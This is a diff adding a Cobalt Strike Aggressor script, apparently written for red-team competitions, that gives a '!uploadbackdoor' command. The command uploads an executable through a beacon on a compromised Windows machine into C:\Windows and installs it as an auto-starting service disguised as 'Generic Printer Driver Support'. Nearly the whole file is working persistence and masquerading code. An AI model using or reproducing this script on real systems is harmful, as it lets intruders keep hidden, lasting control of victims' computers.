@@ -1,0 +1,24 @@
+# Uploads a persistent backdoor on a window becaon as a service
+# Go to Attacks -> Packages -> Windows Executeable (S)
+# Export a Windows Service EXE file
+# Save the exe, I generally use the filename "GenericPrinterServices.exe"
+# Inspired by: http://blog.cobaltstrike.com/2016/02/23/cobalt-strike-tips-for-2016-ccdc-red-teams/
+# Load the script, then in the execute with !uploadbackdoor $BEACON_ID $FULL_LOCAL_PATH_TO_SERVICE_EXE
+# Und3rf10w
+
+alias servicebackdoor {
+	$servicebackdoor = "$2";
+}
+
+alias servicebackdoorfilename {
+	$servicebackdoorfilename = split('/[^/]*$/g', $servicebackdoor);
+}
+
+command !uploadbackdoor {
+	println("\c4Uploading backdoor on beacon: $1 using file $servicebackdoorfilename ");
+	println("\c4Changed Directory to C:\Windows\");
+	bcd($1, "C:\\Windows\\");
+	bupload($1, script_resource("$2"));
+	bshell($1, "sc create GenericPrinterDriver binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \"Generic Printer Driver Support\"");
+	bshell($1, "sc start GenericPrinterDriver");
+}
